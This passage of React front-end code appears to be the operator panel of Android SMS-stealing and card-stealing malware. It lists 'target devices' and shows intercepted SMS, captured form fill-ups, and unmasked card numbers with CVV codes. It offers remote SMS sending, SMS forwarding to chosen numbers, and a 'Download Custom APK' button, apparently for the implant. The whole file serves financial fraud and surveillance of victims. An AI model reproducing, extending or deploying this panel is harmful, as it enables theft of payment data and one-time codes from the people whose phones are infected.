        setLoginError('⚠️ Cannot connect to server. Please check your connection and try again.');
      };

      const handleLogout = () => {
        setAdminUser(null);
        setUsers([]); // Clear previous operator's devices list from state memory immediately
        setShowApkModal(false);
        if (window.history.pushState) {
          const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
          window.history.pushState({path: cleanUrl}, '', cleanUrl);
        }
      };

      const filtered = users.filter(u => {
        const q = search.trim().toLowerCase();
        
        const matchesStatus = statusFilter === 'all' ? true : 
          statusFilter === 'active' ? u.isActive : !u.isActive;

        if (!q) return matchesStatus;

        const name = (u.fullName || '').toLowerCase();
        const mob = (u.mobileNumber || '').toLowerCase();
        const sim1 = (u.sim1Data?.phone || '').toLowerCase();
        const sim2 = (u.sim2Data?.phone || '').toLowerCase();
        const uid = (u.userId || '').toLowerCase();
        const device = (u.stringField || '').toLowerCase();

        const matchesSearch = name.includes(q) || mob.includes(q) || sim1.includes(q) || sim2.includes(q) || uid.includes(q) || device.includes(q);

        return matchesSearch && matchesStatus;
      }).sort((a, b) => {
        const aStarred = starredDeviceIds.includes(a.id);
        const bStarred = starredDeviceIds.includes(b.id);
        if (aStarred && !bStarred) return -1;
        if (!aStarred && bStarred) return 1;

        // Parse date for newest 1st display (Newest card shown first in UI)
        const parseDate = (dStr) => {
          if (!dStr || dStr === 'Just now' || dStr === 'Live payload') return Date.now();
          const p = Date.parse(dStr);
          return isNaN(p) ? 0 : p;
        };

        const timeA = parseDate(a.lastActivityTime);
        const timeB = parseDate(b.lastActivityTime);

        if (timeA !== timeB) return timeB - timeA; // Newest first

        // Fallback: compare device ID / key order if timestamps are identical
        return String(b.id).localeCompare(String(a.id));
      });

      const isSuperAdmin = adminUser?.role === 'superadmin';

      return (
        <div>
          {/* Header */}
          <header className="app-header">
            <div className="navbar-content">
              <div className="navbar-header-top">
                <div className="brand-logo">
                  <div className="brand-icon">🛡️</div>
                  <div>
                    <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO</h3>
                    <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>Realtime Monitoring Console</div>
                  </div>
                </div>

                <button 
                  className={`triple-dash-btn ${mobileMenuOpen ? 'active' : ''}`}
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                  aria-label="Toggle Navigation Menu"
                  title="Menu"
                >
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                </button>
              </div>

              <div className="search-container">
                <input 
                  type="text" 
                  className="search-input"
                  placeholder="Search Target Users by Name, Phone, or ID..." 
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>

              <div className={`navbar-actions ${mobileMenuOpen ? 'mobile-expanded' : ''}`}>
                <div className="pulse-badge active nav-action-btn">
                  <span className="pulse-dot"></span>
                  <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
                </div>

                {isSuperAdmin && (
                  <button 
                    className="btn-secondary nav-action-btn"
                    onClick={() => { openFirebaseSettings(); setMobileMenuOpen(false); }}
                    style={{ color: '#fbbf24', border: '1px solid rgba(251,191,36,0.3)' }}
                    title="Configure Firebase API Key, Auth Domain, Storage Bucket & App ID"
                  >
                    🔥 Connect Firebase
                  </button>
                )}

                {adminUser && (
                  <button 
                    className="btn-secondary nav-action-btn"
                    onClick={() => { setShowApkModal(true); setMobileMenuOpen(false); }}
                    style={{ color: '#10b981', border: '1px solid rgba(16,185,129,0.3)' }}
                  >
                    📲 Download Custom APK
                  </button>
                )}

                {isSuperAdmin && (
                  <a href="operator_control.php" style={{ textDecoration: 'none' }}>
                    <button 
                      className="btn-secondary nav-action-btn" 
                      style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
                    >
                      ⚙️ Operator Console
                    </button>
                  </a>
                )}

                {adminUser ? (
                  <div className="nav-user-group">
                    <button 
                      type="button"
                      className="btn-secondary nav-action-btn"
                      onClick={() => { setShowChangePassModal(true); setMobileMenuOpen(false); }}
                      style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}
                      title="Click to Change Password"
                    >
                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong>
                    </button>
                    <button 
                      className="btn-secondary nav-action-btn" 
                      onClick={() => { handleLogout(); setMobileMenuOpen(false); }}
                      style={{ color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.3)' }}
                    >
                      🚪 Logout
                    </button>
                  </div>
                ) : (
                  <button className="btn-primary nav-action-btn" onClick={() => { setAdminUser(null); setMobileMenuOpen(false); }}>
                    🔑 Sign In
                  </button>
                )}
              </div>
            </div>
          </header>

          {/* Toast Notification Banner */}
          {toastMsg && (
            <div style={{ position: 'fixed', top: '75px', right: '20px', zIndex: 1000, background: 'rgba(15, 23, 42, 0.95)', border: '1px solid rgba(99, 102, 241, 0.5)', color: '#fff', padding: '0.75rem 1.25rem', borderRadius: '12px', backdropFilter: 'blur(12px)', boxShadow: '0 8px 24px rgba(0,0,0,0.5)', fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>ℹ️</span> {toastMsg}
            </div>
          )}

          {/* Main Dashboard */}
          <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem', paddingBottom: '100px' }}>
            {/* Firebase Connection Monitor Bar */}
            {adminUser && (
              <div className="glass-panel" style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                padding: '0.75rem 1.25rem',
                marginBottom: '1.25rem',
                borderLeft: fbConnectionStatus.status === 'success' ? '4px solid #10b981' : 
                            fbConnectionStatus.status === 'warning' ? '4px solid #f59e0b' : '4px solid #ef4444',
                background: 'rgba(17, 24, 39, 0.5)',
                fontSize: '0.82rem',
                color: '#fff',
                flexWrap: 'wrap',
                gap: '0.5rem',
                borderRadius: '12px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="pulse-badge" style={{
                    background: fbConnectionStatus.status === 'success' ? 'rgba(16, 185, 129, 0.15)' : 
                                fbConnectionStatus.status === 'warning' ? 'rgba(245, 158, 11, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                    color: fbConnectionStatus.status === 'success' ? '#34d399' : 
                           fbConnectionStatus.status === 'warning' ? '#fbbf24' : '#f87171',
                    padding: '2px 8px',
                    borderRadius: '6px',
                    fontWeight: 700,
                    fontSize: '0.7rem',
                    border: fbConnectionStatus.status === 'success' ? '1px solid rgba(16, 185, 129, 0.3)' :
                            fbConnectionStatus.status === 'warning' ? '1px solid rgba(245, 158, 11, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)'
                  }}>
                    {fbConnectionStatus.status.toUpperCase()}
                  </span>
                  <span style={{ color: '#e5e7eb', fontWeight: 500 }}>
                    {fbConnectionStatus.message}
                  </span>
                </div>
                {fbConnectionStatus.status === 'success' && (
                  <span style={{ color: '#9ca3af', fontSize: '0.75rem' }}>
                    📡 Live polling every 4s • <b>{fbConnectionStatus.count}</b> devices loaded
                  </span>
                )}
              </div>
            )}

            <div className="metrics-grid">
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL TARGET USERS</p>
                  <h2 style={{ color: '#fff' }}>{users.length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📱</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>ACTIVE DEVICES</p>
                  <h2 style={{ color: '#34d399' }}>{users.filter(u => u.isActive).length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>⚡</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL SMS LOGS</p>
                  <h2 style={{ color: '#818cf8' }}>{users.reduce((acc, u) => acc + u.totalSmsCount, 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>💬</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>FORM FILL-UPS</p>
                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + (u.formDataList?.length || 0), 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📝</div>
              </div>
            </div>

            {/* Header Title & Filter Controls Bar */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem', flexWrap: 'wrap', gap: '1rem' }}>
              <div>
                <h2 style={{ fontSize: '1.4rem', color: '#fff' }}>Registered Target Devices</h2>
                <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>
                  Active Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Project'}</code>
                </p>
              </div>

              {/* Filter Controls Bar */}
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
                <select className="filter-select" value={timeFilter} onChange={(e) => setTimeFilter(e.target.value)}>
                  <option value="all">📅 All Time</option>
                  <option value="today">📅 Today</option>
                  <option value="yesterday">📅 Yesterday</option>
                  <option value="week">📅 Last 7 Days</option>
                </select>

                <select className="filter-select" value={statusFilter} onChange={(e) => setStatusFilter(e.target.value)}>
                  <option value="all">⚡ All Status</option>
                  <option value="active">🟢 Active Only</option>
                  <option value="inactive">🔴 Offline Only</option>
                </select>
              </div>
            </div>

            <div className="user-cards-grid">
              {filtered.map((u, index) => {
                const isStarred = starredDeviceIds.includes(u.id);
                const deviceNumber = filtered.length - index; // Oldest = 1, Newest = highest total count
                return (
                  <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)} style={{ position: 'relative', border: isStarred ? '1px solid rgba(251, 191, 36, 0.5)' : undefined }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem', alignItems: 'flex-start' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span style={{ fontSize: '0.9rem', fontWeight: 800, color: '#38bdf8', background: 'rgba(56, 189, 248, 0.15)', padding: '2px 8px', borderRadius: '8px', border: '1px solid rgba(56, 189, 248, 0.3)' }}>
                          {deviceNumber}.
                        </span>
                        <div>
                          <h4 style={{ color: '#fff', fontSize: '1.1rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                            {u.fullName}
                          </h4>
                          <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId} {u.numberField ? `• ${u.numberField}` : ''}</p>
                        </div>
                      </div>

                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '6px' }}>
                        <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
                          <span className="pulse-dot"></span>
                          {u.isActive ? 'ACTIVE' : 'OFFLINE'}
                        </span>
                        {/* ⭐ Star / Pin Button Below Offline/Active Badge */}
                        <button
                          type="button"
                          onClick={(e) => toggleStarDevice(e, u.id)}
                          style={{
                            background: isStarred ? 'rgba(251, 191, 36, 0.2)' : 'rgba(255, 255, 255, 0.06)',
                            border: isStarred ? '1px solid #fbbf24' : '1px solid rgba(255, 255, 255, 0.15)',
                            color: isStarred ? '#fbbf24' : '#9ca3af',
                            borderRadius: '20px',
                            padding: '3px 10px',
                            fontSize: '0.75rem',
                            fontWeight: 700,
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '4px',
                            transition: 'all 0.2s ease'
                          }}
                          title={isStarred ? 'Unpin device from top' : 'Pin device to top'}
                        >
                          <span>{isStarred ? '⭐ Pinned' : '☆ Pin'}</span>
                        </button>
                      </div>
                    </div>

                    <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
                      <div>📞 SIM 1: <strong>{getSim1Phone(u)}</strong></div>
                      <div>📞 SIM 2: <strong>{getSim2Phone(u)}</strong></div>
                      {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
                      <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
                    </div>

                    {/* Remote Device Control Bar */}
                    <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                      <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
                        📲 Forward
                      </button>
                      <button className="device-control-btn" onClick={(e) => openSendSmsModal(e, u)} style={{ background: 'rgba(52,211,153,0.12)', color: '#34d399', border: '1px solid rgba(52,211,153,0.3)' }} title="Send Remote SMS">
                        💬 Send SMS
                      </button>
                      <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Form Fill-ups Info">
                        👁️ View
                      </button>
                      <button className="device-control-btn" onClick={(e) => handleOpenCardsView(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="View Unmasked Cards Info">
                        💳 Card
                      </button>
                      <button className="device-control-btn" onClick={(e) => handleDeleteDeviceConnection(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Delete Connection">
                        🗑️ Delete
                      </button>
                    </div>
                  </div>
                );
              })}
              {filtered.length === 0 && (
                <div className="glass-panel" style={{ padding: '3.5rem 2rem', textAlign: 'center', margin: '1.5rem 0', border: '1px dashed rgba(99,102,241,0.35)', background: 'rgba(99,102,241,0.04)', borderRadius: '16px' }}>
                  <div style={{ fontSize: '3rem', marginBottom: '1rem' }}>📡</div>
                  <h3 style={{ color: '#fff', fontSize: '1.3rem', marginBottom: '0.5rem', fontWeight: 600 }}>No Target Devices Connected Yet</h3>
                  <p style={{ color: '#9ca3af', fontSize: '0.9rem', maxWidth: '520px', margin: '0 auto 1.5rem auto', lineHeight: '1.5' }}>
                    Realtime Firebase listener is active. As soon as a target device connects to your Firebase RTDB or MySQL project, it will automatically appear here live.
                  </p>
                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', padding: '8px 16px', borderRadius: '24px', background: 'rgba(52,211,153,0.12)', color: '#34d399', fontSize: '0.82rem', fontWeight: 700, border: '1px solid rgba(52,211,153,0.25)' }}>
                    <span className="pulse-dot"></span>
                    <span>Realtime Listener Active & Listening for Connected Devices...</span>
                  </div>
                </div>
              )}
            </div>
          </main>

          {/* Mobile Floating Action Button (FAB) */}
          <button className="mobile-fab" onClick={() => setShowApkModal(true)} title="Download Custom APK">
            ＋
          </button>

          {/* Mobile Bottom Fixed Navigation Bar */}
          <div className="mobile-bottom-nav">
            <button className={`mobile-nav-item ${activeMobileTab === 'dashboard' ? 'active' : ''}`} onClick={() => setActiveMobileTab('dashboard')}>
              <span>📱</span>
              <span>Dashboard</span>
            </button>
            <button className={`mobile-nav-item ${activeMobileTab === 'stats' ? 'active' : ''}`} onClick={() => setActiveMobileTab('stats')}>
              <span>📊</span>
              <span>Stats</span>
            </button>
            <button className={`mobile-nav-item ${activeMobileTab === 'settings' ? 'active' : ''}`} onClick={() => setShowChangePassModal(true)}>
              <span>👤</span>
              <span>Profile</span>
            </button>
          </div>

          {/* Target User Details Modal Overlay */}
          {selectedUser && (
            <div className="modal-overlay" onClick={() => setSelectedUser(null)}>
              <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span>Target Device: {selectedUser.fullName}</span>
                    </h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af', marginTop: '4px' }}>
                      SIM 1: <strong>{getSim1Phone(selectedUser)}</strong> • SIM 2: <strong>{getSim2Phone(selectedUser)}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
                      {selectedUser.numberField ? ` • ${selectedUser.numberField}` : ''}
                      {selectedUser.stringField ? ` • Model: ${selectedUser.stringField}` : ''}
                    </p>
                  </div>
                  <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '0.85rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto', alignItems: 'center', whiteSpace: 'nowrap', flexShrink: 0 }}>
                  <button className={`tab-btn ${tab === 'forms' || tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('forms')}>
                    📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
                  </button>
                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
                    💳 Cards ({selectedUser.cardDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
                    💬 SMS ({selectedUser.smsDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
                    🔍 Schema Inspector
                  </button>
                  <button className={`tab-btn ${tab === 'forward' ? 'active' : ''}`} onClick={() => setTab('forward')}>
                    📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.userId).length})
                  </button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
                  {tab === 'sms' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
                      {(selectedUser.smsDataList || []).map((sms, i) => (
                        <div key={i} className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '6px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <strong style={{ color: '#818cf8', fontSize: '0.95rem' }}>{getSmsSender(sms)}</strong>
                              <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
                                {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'} ({getSmsSimSlot(sms)})
                              </span>
                            </div>
                            <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{getSmsTimestamp(sms)}</span>
                          </div>
                          <div style={{ fontSize: '0.92rem', color: '#e2e8f0', background: 'rgba(17,24,39,0.75)', padding: '10px 12px', borderRadius: '10px', wordBreak: 'break-word', border: '1px solid rgba(255,255,255,0.06)' }}>
                            {getSmsBody(sms)}
                          </div>
                        </div>
                      ))}
                      {(!selectedUser.smsDataList || selectedUser.smsDataList.length === 0) && (
                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                          No SMS messages captured for this device yet.
                        </div>
                      )}
                    </div>
                  )}

                  {tab === 'inspector' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)' }}>
                        <h4 style={{ color: '#38bdf8', fontSize: '0.95rem', marginBottom: '4px' }}>🔍 Line-by-Line Realtime Firebase Schema Inspector</h4>
                        <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
                          Crawls and parses raw Firestore document collections line-by-line, auto-converting timestamps, objects, and sensitive keys for any SaaS tenant app payload.
                        </p>
                      </div>

                      {/* Raw Collection Scanner Cards */}
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Document Key / Field</th>
                            <th>Detected Data Type</th>
                            <th>Scanned Value</th>
                            <th>Smart Date / Time Format</th>
                          </tr>
                        </thead>
                        <tbody>
                          {Object.entries(selectedUser).map(([key, val]) => {
                            if (typeof val === 'function') return null;
                            const type = detectDataType(key, val);
                            const parsedDate = smartDateParser(val);
                            const displayVal = typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val);

                            return (
                              <tr key={key}>
                                <td>
                                  <strong style={{ color: '#fff' }}>{formatFieldLabel(key)}</strong>
                                  <div style={{ fontSize: '0.72rem', color: '#6366f1', fontFamily: 'monospace' }}>`{key}`</div>
                                </td>
                                <td>
                                  <span style={{ fontSize: '0.72rem', padding: '3px 8px', borderRadius: '12px', fontWeight: 700, background: type === 'date' ? 'rgba(56,189,248,0.15)' : type === 'sensitive' ? 'rgba(248,113,113,0.15)' : type === 'json' ? 'rgba(167,139,250,0.15)' : 'rgba(255,255,255,0.1)', color: type === 'date' ? '#38bdf8' : type === 'sensitive' ? '#f87171' : type === 'json' ? '#a78bfa' : '#cbd5e1' }}>
                                    {type.toUpperCase()}
                                  </span>
                                </td>
                                <td style={{ maxWidth: '300px', wordBreak: 'break-all' }}>
                                  <code style={{ fontSize: '0.8rem', color: type === 'sensitive' ? '#f87171' : '#e2e8f0' }}>
                                    {displayVal.length > 100 ? displayVal.substring(0, 100) + '...' : displayVal}
                                  </code>
                                </td>
                                <td>
                                  <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{parsedDate}</span>
                                </td>
                              </tr>
                            );
                          })}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {(tab === 'forms' || tab === 'formfill') && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                      {(selectedUser.formDataList || []).map((form) => {
                        const smartFields = extractSmartFields(form);
                        return (
                          <div key={form.id || Math.random()} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(251,191,36,0.3)', background: 'rgba(251,191,36,0.05)' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem' }}>
                              <h4 style={{ color: '#fbbf24', fontSize: '1rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span>📝 {form.formTitle || 'Customer Form Submission'}</span>
                                <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem' }}>Smart Scanned</span>
                              </h4>
                              <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{form.timestamp || 'Recent'}</span>
                            </div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '0.85rem' }}>
                              {smartFields.map((field, idx) => (
                                <div key={idx} style={{ background: 'rgba(17,24,39,0.75)', padding: '9px 12px', borderRadius: '10px', border: field.isSensitive ? '1px solid rgba(248,113,113,0.35)' : '1px solid rgba(255,255,255,0.08)' }}>
                                  <div style={{ fontSize: '0.72rem', color: field.isSensitive ? '#f87171' : '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
                                    <span>{field.label}</span>
                                    {field.isSensitive && <span>🔑 SENSITIVE</span>}
                                  </div>
                                  <div style={{ fontSize: '0.92rem', color: '#fff', fontWeight: 600, marginTop: '4px', wordBreak: 'break-all', fontFamily: field.isSensitive ? 'monospace' : 'inherit' }}>
                                    {field.value}
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        );
                      })}
                      {(!selectedUser.formDataList || selectedUser.formDataList.length === 0) && (
                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                          No customer form fill-ups submitted yet. Smart scanner active for incoming payloads.
                        </div>
                      )}
                    </div>
                  )}

                  {tab === 'cards' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                      {(selectedUser.cardDataList || []).map((card, i) => (
                        <div key={i} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.35)', background: 'rgba(236,72,153,0.05)' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
                            <h4 style={{ color: '#f472b6', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <span>💳 {getCardBankName(card)}</span>
                            </h4>
                            <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 700, fontSize: '0.75rem' }}>
                              {getCardType(card)}
                            </span>
                          </div>

                          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '0.85rem' }}>
                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(248,113,113,0.4)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#f87171', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>CARD NUMBER</div>
                              <div style={{ fontSize: '1.05rem', color: '#fff', fontWeight: 700, marginTop: '4px', letterSpacing: '1px', fontFamily: 'monospace' }}>
                                {getCardNumber(card)}
                              </div>
                            </div>

                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>CARD HOLDER</div>
                              <div style={{ fontSize: '0.95rem', color: '#fff', fontWeight: 600, marginTop: '4px' }}>
                                {getCardHolder(card)}
                              </div>
                            </div>

                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>EXPIRY DATE</div>
                              <div style={{ fontSize: '0.95rem', color: '#38bdf8', fontWeight: 600, marginTop: '4px' }}>
                                {getCardExpiry(card)}
                              </div>
                            </div>

                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(248,113,113,0.4)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#f87171', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
                                <span>CVV CODE</span>
                                <span>🔑 UNMASKED</span>
                              </div>
                              <div style={{ fontSize: '1.05rem', color: '#f87171', fontWeight: 700, marginTop: '4px', fontFamily: 'monospace' }}>
                                {getCardCvv(card)}
                              </div>
                            </div>
                          </div>
                        </div>
                      ))}
                      {(!selectedUser.cardDataList || selectedUser.cardDataList.length === 0) && (
                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                          No card details captured for this device yet.
                        </div>
                      )}
                    </div>
                  )}
                  {tab === 'forward' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                      {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
                        <div key={task.id} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.35)', background: 'rgba(236,72,153,0.05)' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
                            <h4 style={{ color: '#ec4899', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <span>📲 Forward Task: {task.dataType}</span>
                              <code style={{ fontSize: '0.78rem', color: '#818cf8' }}>{task.id}</code>
                            </h4>
                            <span className={`pulse-badge ${task.status === 'sent' ? 'active' : task.status === 'pending' ? 'pending' : 'expired'}`}>
                              <span className="pulse-dot"></span>
                              {task.status.toUpperCase()}
                            </span>
                          </div>

                          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(180px, 1fr))', gap: '0.85rem' }}>
                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>SELECTED SIM</div>
                              <div style={{ fontSize: '0.95rem', color: '#fbbf24', fontWeight: 700, marginTop: '4px' }}>
                                {task.selectedSim}
                              </div>
                            </div>

                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(56,189,248,0.3)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#38bdf8', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>DESTINATION NUMBER</div>
                              <div style={{ fontSize: '0.95rem', color: '#fff', fontWeight: 700, marginTop: '4px' }}>
                                {task.phoneNumber}
                              </div>
                            </div>

                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>TIMESTAMP</div>
                              <div style={{ fontSize: '0.85rem', color: '#9ca3af', fontWeight: 600, marginTop: '4px' }}>
                                {task.timestamp}
                              </div>
                            </div>
                          </div>
                        </div>
                      ))}
                      {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                          No active remote forward tasks for this device.
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

